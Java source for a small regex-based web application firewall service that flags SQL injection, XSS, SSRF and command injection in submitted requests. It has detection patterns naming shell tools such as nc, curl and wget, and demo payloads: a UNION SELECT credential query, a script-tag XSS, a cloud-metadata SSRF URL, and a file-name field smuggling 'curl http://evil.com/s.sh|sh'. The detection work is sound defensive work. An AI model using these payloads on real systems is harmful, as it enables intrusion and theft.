package com.cartier;

import static spark.Spark.after;
import static spark.Spark.before;
import static spark.Spark.get;
import static spark.Spark.options;
import static spark.Spark.port;
import static spark.Spark.post;
import static spark.Spark.staticFiles;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.lang.reflect.Type;
import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class App {
    private static final Gson GSON = new Gson();
    private static final Pattern URL_PATTERN = Pattern.compile("https?://[^\\s'\"<>]+", Pattern.CASE_INSENSITIVE);
    private static final Pattern SCHEME_PATTERN =
            Pattern.compile("\\b(file|gopher|dict|ftp|smb|ldap)://", Pattern.CASE_INSENSITIVE);

    private static final List<Rule> SQLI_RULES = Arrays.asList(
            new Rule("sqli_union_select", "\\bunion\\b\\s+\\bselect\\b", "UNION SELECT sequence"),
            new Rule("sqli_boolean_tautology", "\\bor\\b\\s+1\\s*=\\s*1\\b", "Boolean tautology (or 1=1)"),
            new Rule("sqli_select_from", "\\bselect\\b\\s+.+\\bfrom\\b", "SELECT ... FROM pattern"),
            new Rule("sqli_comment", "(--|/\\*|\\*/)", "SQL comment marker"),
            new Rule("sqli_time_delay", "\\b(waitfor\\s+delay|sleep\\s*\\()", "Time delay function")
    );

    private static final List<Rule> XSS_RULES = Arrays.asList(
            new Rule("xss_script_tag", "<\\s*script\\b", "Script tag"),
            new Rule("xss_event_handler", "on\\w+\\s*=", "Inline event handler"),
            new Rule("xss_js_scheme", "javascript\\s*:", "javascript: URI scheme"),
            new Rule("xss_img_onerror", "<\\s*img\\b[^>]*onerror\\s*=", "Image onerror handler"),
            new Rule("xss_svg_onload", "<\\s*svg\\b[^>]*onload\\s*=", "SVG onload handler")
    );

    private static final List<Rule> RCE_RULES = Arrays.asList(
            new Rule("rce_shell_chain", "(;|\\|\\||&&|\\|)\\s*", "Shell command chain operator"),
            new Rule("rce_substitution", "(\\$\\([^\\)]+\\)|`[^`]+`)", "Command substitution"),
            new Rule("rce_suspicious_binary",
                    "\\b(bash|sh|cmd\\.exe|powershell|nc|netcat|curl|wget|python\\s+-c|perl\\s+-e|php\\s+-r)\\b",
                    "Suspicious binary invocation")
    );

    public static void main(String[] args) {
        port(resolvePort());
        staticFiles.location("/public");

        options("/*", (req, res) -> {
            String requestHeaders = req.headers("Access-Control-Request-Headers");
            if (requestHeaders != null) {
                res.header("Access-Control-Allow-Headers", requestHeaders);
            }
            String requestMethod = req.headers("Access-Control-Request-Method");
            if (requestMethod != null) {
                res.header("Access-Control-Allow-Methods", requestMethod);
            }
            return "OK";
        });

        before((req, res) -> res.header("Access-Control-Allow-Origin", "*"));
        after((req, res) -> res.type("application/json"));

        get("/health", (req, res) -> GSON.toJson(Map.of("status", "ok", "service", "cartier-waf")));

        get("/api/samples", (req, res) -> GSON.toJson(samplePayloads()));

        post("/api/analyze", (req, res) -> {
            Type mapType = new TypeToken<Map<String, Object>>() {}.getType();
            Map<String, Object> body = GSON.fromJson(req.body(), mapType);
            String method = getString(body, "method");
            String url = getString(body, "url");
            String headers = getString(body, "headers");
            String payload = getString(body, "payload");
            String requestBody = getString(body, "body");

            if (payload == null || payload.isBlank()) {
                payload = String.format("%s %s\n%s\n\n%s", safe(method), safe(url), safe(headers), safe(requestBody));
            }

            Map<String, Object> result = analyzePayload(payload);
            return GSON.toJson(result);
        });
    }

    private static int resolvePort() {
        String env = System.getenv("PORT");
        if (env == null || env.isBlank()) {
            return 8080;
        }
        try {
            return Integer.parseInt(env);
        } catch (NumberFormatException ex) {
            return 8080;
        }
    }

    private static Map<String, Object> analyzePayload(String payload) {
        String normalized = normalize(payload);
        List<Map<String, Object>> findings = new ArrayList<>();

        List<Map<String, String>> sqliEvidence = findRegexEvidence(SQLI_RULES, normalized);
        if (!sqliEvidence.isEmpty()) {
            findings.add(buildFinding("SQLi", sqliEvidence));
        }

        List<Map<String, String>> xssEvidence = findRegexEvidence(XSS_RULES, normalized);
        if (!xssEvidence.isEmpty()) {
            findings.add(buildFinding("XSS", xssEvidence));
        }

        List<Map<String, String>> ssrfEvidence = detectSsrf(normalized);
        if (!ssrfEvidence.isEmpty()) {
            findings.add(buildFinding("SSRF", ssrfEvidence));
        }

        List<Map<String, String>> rceEvidence = findRegexEvidence(RCE_RULES, normalized);
        if (!rceEvidence.isEmpty()) {
            findings.add(buildFinding("RCE", rceEvidence));
        }

        Map<String, Object> summary = new LinkedHashMap<>();
        summary.put("attack_detected", !findings.isEmpty());
        summary.put("top_attack", findings.isEmpty() ? "None" : findings.get(0).get("attack"));
        summary.put("count", findings.size());

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("summary", summary);
        result.put("findings", findings);
        return result;
    }

    private static List<Map<String, String>> findRegexEvidence(List<Rule> rules, String text) {
        List<Map<String, String>> evidence = new ArrayList<>();
        for (Rule rule : rules) {
            Matcher matcher = rule.pattern.matcher(text);
            if (matcher.find()) {
                Map<String, String> entry = new LinkedHashMap<>();
                entry.put("rule", rule.id);
                entry.put("match", clip(matcher.group(0)));
                entry.put("reason", rule.reason);
                evidence.add(entry);
            }
        }
        return evidence;
    }

    private static List<Map<String, String>> detectSsrf(String text) {
        List<Map<String, String>> evidence = new ArrayList<>();
        Matcher matcher = URL_PATTERN.matcher(text);
        while (matcher.find()) {
            String candidate = matcher.group(0);
            String host = null;
            try {
                URI uri = URI.create(candidate);
                host = uri.getHost();
            } catch (IllegalArgumentException ex) {
                host = null;
            }
            if (host != null && isInternalHost(host)) {
                Map<String, String> entry = new LinkedHashMap<>();
                entry.put("rule", "ssrf_internal_host");
                entry.put("match", clip(candidate));
                entry.put("reason", "Internal host target (" + host + ")");
                evidence.add(entry);
            }
        }

        Matcher schemeMatcher = SCHEME_PATTERN.matcher(text);
        while (schemeMatcher.find()) {
            Map<String, String> entry = new LinkedHashMap<>();
            entry.put("rule", "ssrf_unusual_scheme");
            entry.put("match", schemeMatcher.group(1) + "://");
            entry.put("reason", "Unusual URL scheme");
            evidence.add(entry);
        }

        return evidence;
    }

    private static boolean isInternalHost(String host) {
        String value = host.toLowerCase(Locale.ROOT);
        if (value.equals("localhost") || value.equals("127.0.0.1") || value.equals("0.0.0.0") || value.equals("::1")
                || value.equals("metadata") || value.equals("metadata.google.internal") || value.equals("host.docker.internal")) {
            return true;
        }
        if (value.startsWith("10.") || value.startsWith("192.168.") || value.startsWith("169.254.")) {
            return true;
        }
        if (value.startsWith("172.")) {
            String[] parts = value.split("\\.");
            if (parts.length > 1) {
                try {
                    int second = Integer.parseInt(parts[1]);
                    return second >= 16 && second <= 31;
                } catch (NumberFormatException ignored) {
                    return false;
                }
            }
        }
        return false;
    }

    private static Map<String, Object> buildFinding(String attack, List<Map<String, String>> evidence) {
        double score = Math.min(1.0, 0.3 * evidence.size());
        String confidence;
        if (score >= 0.7) {
            confidence = "high";
        } else if (score >= 0.4) {
            confidence = "medium";
        } else {
            confidence = "low";
        }
        Map<String, Object> finding = new LinkedHashMap<>();
        finding.put("attack", attack);
        finding.put("score", Math.round(score * 100.0) / 100.0);
        finding.put("confidence", confidence);
        finding.put("evidence", evidence);
        return finding;
    }

    private static String normalize(String text) {
        if (text == null) {
            return "";
        }
        String value = text;
        for (int i = 0; i < 2; i++) {
            try {
                value = URLDecoder.decode(value, StandardCharsets.UTF_8);
            } catch (IllegalArgumentException ignored) {
                // keep current value
            }
        }
        return value;
    }

    private static String clip(String value) {
        if (value == null) {
            return "";
        }
        int limit = 120;
        if (value.length() <= limit) {
            return value;
        }
        return value.substring(0, limit - 3) + "...";
    }

    private static String getString(Map<String, Object> map, String key) {
        if (map == null || key == null) {
            return "";
        }
        Object value = map.get(key);
        if (value == null) {
            return "";
        }
        return String.valueOf(value);
    }

    private static String safe(String value) {
        return value == null ? "" : value;
    }

    private static Map<String, Map<String, String>> samplePayloads() {
        Map<String, Map<String, String>> samples = new LinkedHashMap<>();

        samples.put("sqli", new LinkedHashMap<>(Map.of(
                "method", "GET",
                "url", "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "headers", "User-Agent: CartierTest\nAccept: */*",
                "body", ""
        )));

        samples.put("xss", new LinkedHashMap<>(Map.of(
                "method", "GET",
                "url", "https://shop.example.com/search?q=<script>alert(1)</script>",
                "headers", "User-Agent: CartierTest\nAccept: */*",
                "body", ""
        )));

        samples.put("ssrf", new LinkedHashMap<>(Map.of(
                "method", "POST",
                "url", "https://shop.example.com/fetch",
                "headers", "Content-Type: application/json",
                "body", "{\"url\":\"http://169.254.169.254/latest/meta-data/iam\"}"
        )));

        samples.put("rce", new LinkedHashMap<>(Map.of(
                "method", "POST",
                "url", "https://shop.example.com/convert",
                "headers", "Content-Type: application/x-www-form-urlencoded",
                "body", "file=report.pdf;curl http://evil.com/s.sh|sh"
        )));

        return samples;
    }

    private static class Rule {
        private final String id;
        private final Pattern pattern;
        private final String reason;

        private Rule(String id, String regex, String reason) {
            this.id = id;
            this.pattern = Pattern.compile(regex, Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
            this.reason = reason;
        }
    }
}
